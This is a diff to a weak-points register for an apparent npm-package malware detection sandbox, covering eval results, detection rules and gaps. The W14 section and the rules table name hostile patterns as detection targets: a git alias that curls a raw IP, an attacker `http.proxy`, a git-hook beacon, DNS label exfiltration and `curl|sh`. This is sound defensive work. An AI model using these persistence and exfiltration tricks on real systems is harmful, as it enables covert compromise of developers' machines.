@@ -11,11 +11,11 @@ touches the Chamber or a live check.
 | # | Weak point | Severity | Gate |
 |---|---|---|---|
 | W1 | No demo video | **Highest** (25% of score, lowest-scoring category) | Before |
-| W2 | `m12` verdict is a coin flip | High (our headline number) | Before, if measured |
+| W2 | `m12` verdict is a coin flip | High (our headline number) | Ships **off**; 3 of 4 conditions now measured |
 | W3 | 6 of 104 benign unverifiable | Medium | After |
 | W4 | Grounding metric narrower than it sounds | Medium (we overstated it) | **(a) wording done Nov 3**; (b) checker after judging |
 | W5 | `rt08` open miss | Medium | After |
-| W6 | Single Chamber VM, no tested restore | **High** (demo-day risk) | Before |
+| W6 | Single Chamber VM, no tested restore | High (demo-day risk) — **lower since Nov 3: the IP is Elastic, so TLS pinning survives a reboot**; the missing AMI is what's left | Before |
 | W7 | Reconciler deployed but never fired | Medium | Before |
 | W8 | Sandbox egress is open TCP | Medium (honestly documented) | After |
 | W9 | Private-repo path never exercised | Low–Medium | Before (cheap) |
@@ -23,6 +23,8 @@ touches the Chamber or a live check.
 | W11 | Disclosed package unfixed; name in git history | Medium (ethical) | Ongoing |
 | W12 | Red-team set is not blind | Medium (claim hygiene) | After |
 | W13 | One path where a model decision can clear a rule hit | Medium (claim hygiene) | **Closed in code Nov 3** |
+| W14 | `git config` / `.git/hooks` are an untraced attack surface | Medium (found by the held-out set, Nov 3) | After |
+| W15 | DNS encoded-label rule has a length floor a short label evades | Low–Medium (found by the held-out set, Nov 3) | After |
 
 ---
 
@@ -143,6 +145,86 @@ we quote the distribution rather than the best run.*
 `eval/repeat.py` to avoid the throttling, and check condition 3 first — the 6 benign
 `Could not verify` native-build packages are the ones at risk from the widening.
 
+### Nov 3: three of the four conditions recovered from the recorded trials, free
+
+`eval/band_sim.py` reconstructs the widened band from the two arms already committed in
+`eval/REPEAT_W2.json` (42 cases × 5 trials), without another API call. The band draws one
+sample and re-samples only when that sample's verdict is borderline, so per trial it is
+`sampled[i] if full[i] in BORDERLINE_TITLES else full[i]`.
+
+| | `full` (N=1) | `sampled` (worst of 3) | **band (reconstructed)** |
+|---|---|---|---|
+| Attack flips | 1/38 (`m12`) | 1/38 (`gm08`) | **0/38** |
+| Attacks mergeable, worst trial | 2/38 | 1/38 | **1/38** (`rt08` only) |
+| Benign Blocked, any trial | 0/4 | 0/4 | **0/4** |
+
+The band is better than *both* recorded arms on flip rate, and it settles the case W2 exists
+for: `m12-domain-exfil` goes from Blocked ×4 / Needs review ×1 to **Blocked ×5**. It also avoids
+`gm08`'s flip, which the unconditional arm had, because `gm08` is Blocked at N=1 and so is never
+re-sampled.
+
+**One part is a proof rather than an estimate.** The band either keeps the single sample's
+verdict or raises it with `max`, so no attack can become *more* mergeable than at N=1 — for any
+N, on any corpus, independent of these trials. Acceptance 1's safety direction holds by
+construction, and a test checks it against the data as well.
+
+**What this is not.** The two arms were scored as separate runs, so `full[i]` is an independent
+draw rather than literally the first of `sampled[i]`'s three. It is a Monte Carlo estimate over
+5 trials, which cannot distinguish a flip rate of 0 from a few percent. Evidence toward
+acceptance 1, not the measured run the gate asks for.
+
+### Nov 3: acceptance 3 measured, with the real band code
+
+The 6 at-risk packages were absent from the 42-case corpus, so they were run on their own —
+`eval/REPEAT_W2_NATIVE.{json,md}`, stamped clean at `8057a42`, 5 trials, `sampled` arm, 120
+model calls for about **$1.50** rather than the $25 a full re-score costs.
+
+| Package | Outcome across 5 trials |
+|---|---|
+| `better-sqlite3`, `argon2`, `cpu-features`, `node-pty`, `biome`, `cypress` | `Could not verify` ×5 — **0 Blocked, 0 flips** |
+
+This is a measurement of the **widened band itself**, not of unconditional N=3: at this commit
+`brain/sampling.py::sample_analysis` draws one sample and re-samples only when `needs_more`
+fires, and `pipeline.analyze` passes the `BORDERLINE_TITLES` predicate. The abandoned round-2
+run is therefore no longer wholly missing.
+
+**And the population acceptance 2 and 3 have to cover is 10, not 104.** The band cannot touch a
+case whose first sample is not borderline — it returns that sample unchanged, which
+`tests/test_sampling.py::test_clean_is_never_resampled_because_that_is_where_the_volume_is` and
+`test_no_resample_when_the_first_answer_is_not_borderline` pin in code. So the 94 benign cases
+that read Clean at N=1 are unaffected *by construction*, and the only benign cases the band can
+reach are the 4 at ⚠️ and the 6 unverified. Both groups are now measured:
+
+| Benign group | Measured | Result |
+|---|---|---|
+| 4 at ⚠️ (`puppeteer`, `playwright-chromium`, `chromedriver`, `prisma`) | round 1 | ⚠️ ×5, **0 Blocked** |
+| 6 unverified native builds | Nov 3 | `Could not verify` ×5, **0 Blocked** |
+| 94 Clean at N=1 | not needed | never re-sampled, by construction |
+
+Residual, stated rather than glossed: a benign case that normally reads Clean but *occasionally*
+draws a borderline first sample would enter the band on that trial. That path is unmeasured for
+the 94. It is second-order — the same case can already draw a bad sample at N=1 — but it is not
+nothing.
+
+### Verdict: W2 still ships **off**, `MODEL_SAMPLES = 1`.
+
+What is measured: acceptance **2**, **3** (for every benign case the band can reach) and **4**
+(priced at $0.0212/PR worst case against the $0.04 budget).
+
+What is not: **acceptance 1**, flip rate 0 on the attack cases, *with the band code*. The 0/38
+figure above is a reconstruction from recorded arms plus the monotonicity proof — strong, but the
+gate asks for a measured run and says so for a reason. Closing it is one more targeted run, since
+a Blocked case never re-samples and so costs a single analysis call:
+
+```powershell
+python -m eval.repeat <telemetry-dir> --trials 5 --arms sampled --workers 1 `
+  --only m01-...,m16-...,r01-ua-parser-js,r02-shai-hulud --out eval/REPEAT_W2_ATTACKS
+```
+
+≈190 calls, **≈$2.50** for the 18 malicious + incident cases. Until then the default stays 1,
+and `tests/test_band_sim.py` asserts it, so nobody can mistake three conditions plus a proof for
+four conditions measured.
+
 ---
 
 ## W3 — 6 of 104 benign packages cannot be verified
@@ -151,6 +233,14 @@ we quote the distribution rather than the best run.*
 `chamber/sandbox/Dockerfile` is `node:20-slim` plus curl/wget/netcat/git/python3 — **there is no
 C toolchain**, so `node-gyp` cannot build. `biome` and `cypress` hit the install timeout. That
 is ~6% of mainstream packages on which we return no answer.
+
+**The timeout half is not a fixed rate (measured Nov 3).** Re-detonating all 104 benign controls
+a day later, `biome` completed in **5.8 s** and `cypress` in **40 s** — both well inside the
+240 s limit they had exceeded on Nov 2. So that run's 6 was 4 the next day, and the two timeout
+cases are a registry/CDN speed artifact rather than a property of the sandbox. The four native
+builds failed identically both times, which is the real, reproducible half of this entry. The
+stamped `eval/results.json` is deliberately left at the Nov 2 figures; see
+[`eval/PERSISTENCE.md`](../eval/PERSISTENCE.md) for the re-run it came from.
 
 **Plan.** Two independent changes, measured separately:
 - **(a) Toolchain.** Add `build-essential` (and `pkg-config`) to the sandbox image, rebuild, and
@@ -298,6 +388,103 @@ threshold is chosen. Signal must separate them with **zero** benign hard blocks 
 
 **Gate: after judging.** `rt08` stays a reported miss, which is already in the write-up.
 
+### Nov 3: the gap is now measured, and it is telemetry, not rules
+
+With the raw telemetry pulled off the Chamber (`docs/HANDOFF.md` §6) and re-scored offline by
+`eval/score_rules.py`, the rules-level misses are no longer a guess. Ten attack cases are not
+Blocked by rules alone, and they fall into three groups:
+
+| Why the rules miss it | Cases | What would close it |
+|---|---|---|
+| The payload writes a file, and only *bait* paths are traced | `gm04`, `rt06` (`~/.bashrc`) — **closed Nov 3: policy deployed, rule at HIGH, both now Blocked**; `gm10`, `rt07` (sibling package tamper) still open | `persistence-files.yaml` did the first two; a write-only filter with a volume benchmark for the others |
+| Tetragon traces `tcp_connect`, not `bind`/`listen` | `gm09` (backdoor listener) | A `listen`/`bind` tracing policy — but see the note below: this case binds loopback only |
+| CPU only, or nothing observable at all | `rt08`, `gm08` (miners), `rt10` (dormant by design) | W5 above; `rt10` has nothing to see and is correctly model-caught |
+| Observable, and now caught | `gm05` (cron injection) | **Done** — `EXEC_SCHEDULED_PERSISTENCE` |
+
+**`m12-domain-exfil` stays model-caught deliberately.** Its payload sends a dummy body, so it
+never touches the decoy credentials; from telemetry alone a `POST` to `example.com` is
+indistinguishable from a benign telemetry ping. A rule here would be fitted to the test case
+rather than to the behaviour, so it was not written.
+
+So four of the ten misses share **one** root cause: `file_events` covers only the planted bait
+credential files. That is the same cause W5 identifies for the miner gap ("a compiler's constant
+writes are invisible to us"), which makes file-write telemetry the highest-value single change
+available.
+
+### Nov 3: half of it is done, and the half that is left is a volume problem
+
+The four cases split cleanly, and only one half is safe to do without measurement:
+
+**Done — deployed and measured, Nov 3.** `chamber/policies/persistence-files.yaml` traces opens
+of shell startup files, cron spools and systemd units — the paths `gm04` and `rt06` append to. It
+reuses `security_file_open` and the same single `file` argument as the credential policy already
+running on the Chamber, so **no new Tetragon JSON shape** is involved. It is a *separate* policy
+rather than extra prefixes on the credential one, so deploying was additive and rollback does not
+disturb credential tracing. `FILE_PERSISTENCE` classifies those paths, with `CRED_FILE_ACCESS`
+left for the bait files — a `.bashrc` is not "a planted fake credential", and the old code would
+have said so.
+
+It shipped at **LOW** first, because a rule that cannot fire yet has no false-positive evidence
+at all, and blocking on an unmeasured signal is what these gates exist to prevent. It is now at
+**HIGH**, earned: full write-up in [`eval/PERSISTENCE.md`](../eval/PERSISTENCE.md).
+
+| | Result |
+|---|---|
+| Benign controls opening a persistence path | **0 of 104** (re-detonated live with the policy loaded) |
+| Runs with truncated telemetry | **0 of 106** |
+| `gm04-rcfile-persist` | no rule fired → **Blocked** (`~/.bashrc` + `~/.zshrc`) |
+| `rt06-persist-rcfile` | no rule fired → **Blocked** (`~/.bashrc`) |
+
+Validity was checked before the result: npm reads `~/.npmrc` on every install, so every traced
+record carries a file event — 0 of 104 lacked one, 0 had a blind collector, 0 failed the sensor
+witness. "0 of 104" therefore means nothing opened these paths, not that tracing was dead.
+
+Two honest notes. The policy is **host-global**, so host shell startups reading
+`/etc/bash.bashrc` post events too (7 observed, all `/bin/bash` outside any container, from SSH
+logins) — filtered by the Chamber's parser, negligible against the 200 MB export budget. And two
+benign verdicts differ from the stamped eval, **neither caused by this rule**: `biome` and
+`cypress` had hit the 240 s timeout on Nov 2 and completed on Nov 3, which makes W3's "6 could
+not verify" a property of that run rather than a fixed rate — see W3.
+
+**Still open: sibling-package tampering (`gm10`, `rt07`).** These rewrite a file inside a
+*different* `node_modules` package. Tracing that needs writes under `/work/node_modules/`, which
+npm writes constantly — a `Prefix` selector there would report thousands of events per install,
+flood the cap, and because truncation fails closed, turn every verdict into "Could not verify".
+Closing it needs a write-only filter (not `security_file_open`, which fires on reads too) plus a
+volume benchmark, and a discriminator for the legitimate case: a postinstall script writing into
+its *own* package directory is normal, into a sibling's is not. The kernel-recorded `cwd` that
+`brain/pinpoint.py` already uses for attribution is the right basis. That is a genuine piece of
+work, not a prefix edit, and it stays gated.
+
+**`gm09`'s listener is also weaker than its label.** It binds `127.0.0.1:31337` — loopback only,
+unreachable from outside the sandbox. Catching it needs `bind`/`listen` tracing, but the case as
+written does not demonstrate a reachable backdoor, so it is not the strongest motivation for
+that work.
+
+### `EXEC_SCHEDULED_PERSISTENCE`, added Nov 3
+
+Five candidate signals were measured against **3342 exec events across 742 recorded installs**
+(the 142 eval cases plus the 100- and 500-package registry sweeps; 604 of those are uncurated
+packages straight off the npm feed) *before* any was written:
+
+| Candidate | Attacks | Benign (104) | Uncurated (604) | Decision |
+|---|---|---|---|---|
+| cron / systemd / `at` | 1 | **0** | **0** | **Shipped** (HIGH) |
+| `chmod +x` | 0 | 0 | **2** | Rejected — real packages do this |
+| `curl\|sh`, `wget\|sh` | 3 | 0 | 0 | No new catch: all three already Block |
+| base64 → shell | 1 | 0 | 0 | Already covered by `EXEC_DECODE_PIPE` |
+| `~/.bashrc`, `authorized_keys`, `nohup`, `LD_PRELOAD`, history tampering | **0** | 0 | 0 | No signal — those payloads use node's `fs` API, so argv cannot see them |
+
+Verdict impact, measured rather than argued: **exactly one case moves**, `gm05-cron-inject`
+Clean → Blocked at the rules level. Its `full` verdict was already Blocked, so **no published
+figure changes**. Recorded as the single entry in `eval/score_rules.py::KNOWN_DRIFT`, which
+fails if an unexplained disagreement with the stamped eval appears *or* if a listed one
+disappears. Mutation-tested 11/11.
+
+The first version of the pattern was too loose — a plain `\bcrontab\b` also matches
+`docs/crontab-format.md`, which a package shipping cron documentation would ship. Its own test
+caught that before it shipped; the pattern now matches only in command position.
+
 ---
 
 ## W6 — Single Chamber VM with no tested restore
@@ -324,6 +511,26 @@ doesn't cost money or confuse the Brain.
 
 **Gate: before the deadline.** It costs one snapshot and about half an hour, and it is the
 difference between a bad hour and a lost submission. **Ask before creating any AWS resource.**
+
+### Nov 3: the address is an **Elastic IP** — owner confirmed
+
+This was the open question `docs/CHAMBER_RECOVERY.md` told us to answer "now", and it removes the
+worst failure mode. `3.223.99.234` is allocated, not ephemeral, so:
+
+- **A stop/start no longer changes the address**, which means the Brain's pinned certificate
+  (`CHAMBER_CA_PEM`, with `IP Address:3.223.99.234` as a SAN) keeps verifying. The scenario where
+  every check silently becomes "Could not verify" because the IP moved is off the table for a
+  reboot, and for a restore as long as the EIP is reassociated.
+- Recovery therefore reduces to: launch from the AMI, **reassociate the Elastic IP**, restart the
+  services, check `/health`. No certificate regeneration and no Modal secret update — which was
+  the slow, error-prone half of step 4 in the runbook.
+
+**What is still open in W6 is the snapshot itself.** There is no AMI, so a restore has nothing to
+restore *from*; the EIP only guarantees the address will be right once something is running at
+it. That remains an AWS-console action, and the drill in step 3 remains unrehearsed.
+
+Severity is accordingly lower than it was — the failure mode is now "rebuild from scratch under
+time pressure" rather than "rebuild and then discover TLS no longer verifies".
 
 ---
 
@@ -613,6 +820,64 @@ each tied to a package in the control set. If one of those vendors were compromi
 CDN, a predicted fetch from it would still be cleared. That is a supply-chain assumption, not an
 author-controlled path, and it is the assumption `DEFAULT_ALLOWED_DOMAINS` already makes about
 `registry.npmjs.org`.
+
+---
+
+## W14 — `git config` and `.git/hooks` are an untraced attack surface
+
+**Found by the held-out blind corpus, Nov 3** (`eval/BLIND_RESULTS.md`). Three of that set's four
+rules-level misses share one root cause: an install script can arrange code to run on *later*
+git activity, and nothing inspects it.
+
+- `git config --global alias.X '!curl http://<raw-ip>/…'` — a command fires on later git use
+  (`bc04`).
+- `git config --global http.proxy http://<attacker>` — future git HTTP traffic is MITM'd
+  (`bc10`).
+- writing an executable `.git/hooks/post-checkout` that beacons on the next checkout (`bc03`).
+
+**Why the rules miss it.** All three are **dormant at install time**: the payload does not
+connect, drop a binary, or touch a traced persistence path while the sandbox is watching, so no
+behavioural rule has anything to fire on. Note the exec of `git config …` *is* captured — in
+`bc04` and `bc10` the raw IP is right there in the recorded args — so the evidence exists; no
+rule reads `git config` arguments, and the persistence policy does not cover `.git/hooks/` or
+`~/.gitconfig`.
+
+**Plan (post-judging).** Two measured changes, each gated like every other detection change
+(frozen corpus, benign false-positive rate, rollback):
+- an exec-args rule for `git config --global` writing `http.proxy`, `core.hookspath`, `alias.*`
+  containing a `!`-prefixed shell command, or `url.*.insteadOf` — all of which are install-time
+  red flags and none of which a normal `npm install` runs;
+- extend `persistence-files.yaml` to `.git/hooks/` and `~/.gitconfig` writes, with the same
+  false-positive measurement `FILE_PERSISTENCE` got (0 of 104 benign).
+
+**The model arm catches all three** (measured Nov 3, `eval/blind_model_arm.json`): reading the
+install-script source, it flags `bc03`, `bc04` as Blocked and `bc10` as Needs-review. So this is
+a *deterministic-floor* gap, not a full-pipeline one — the rules miss it, the model does not. The
+value of closing it in the rules too is defence in depth and not depending on a model draw
+(whose verdict has measured variance), which is why it is still worth doing, just not urgently.
+
+**Gate: after judging.** Two new rules two days out, unmeasured against the benign set, is
+exactly the trade this document refuses. Recorded now; measured later.
+
+## W15 — the DNS encoded-label rule has a length floor a short label evades
+
+**Found by the held-out blind corpus, Nov 3.** `DNS_ENCODED_LABEL` fires on an encoded-looking
+label of `MIN_ENCODED_LABEL = 40`+ characters. `bc08` hex-encodes a hostname into a **24-char**
+label — real exfiltration of a short identifier — which sits under the floor, so the rule stays
+silent even though the DNS query is captured in full.
+
+**Why the floor exists, and why it cannot just be lowered.** The threshold is there to avoid
+flagging legitimate long-ish labels — CDN cache keys, content-addressed hashes, telemetry ids —
+which are common and benign. Lowering it trades directly against the benign false-positive rate.
+
+**Plan (post-judging).** Measure the label-length and character-class distribution of DNS
+queries across the 742-install corpus, then set the floor (and perhaps an entropy test) where it
+separates `bc08`-style exfil from benign long labels with zero benign hard blocks — the same
+acceptance every rule change gets. If no clean separation exists, record the negative result and
+leave the floor where it is.
+
+**Gate: after judging.** A one-line constant change to a verdict-affecting rule, without the
+false-positive measurement, is not something to ship two days out.
 
 ---
 
